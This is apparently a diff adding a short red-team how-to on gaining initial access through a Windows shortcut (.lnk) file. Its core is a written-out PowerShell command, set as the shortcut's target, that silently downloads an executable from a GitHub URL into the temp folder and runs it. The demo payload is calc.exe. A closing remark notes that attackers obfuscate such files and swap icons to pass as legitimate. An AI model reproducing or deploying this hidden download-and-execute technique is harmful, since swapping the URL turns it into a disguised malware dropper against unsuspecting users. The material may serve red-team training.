@@ -1,0 +1,7 @@
+1) Create a shortcut file (Right click-> New-> Shortcut) 
+2) Go to the properties of File in Target paste this.
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command "iwr -useb https://github.com/rhoax010/Red-Teaming/raw/main/Initial%20Access%20With%20LNK/calc.exe -OutFile $env:TEMP\calc.exe; Start-Process $env:TEMP\calc.exe"
+3) Apply and Ok. ( Now when You double click on file you will show to spawn calc.exe) 
+
+Note:- Attackers often obfuscate .lnk files in various ways to bypass AV/EDR,
+and they change the icon to make it look like a legitimate file.
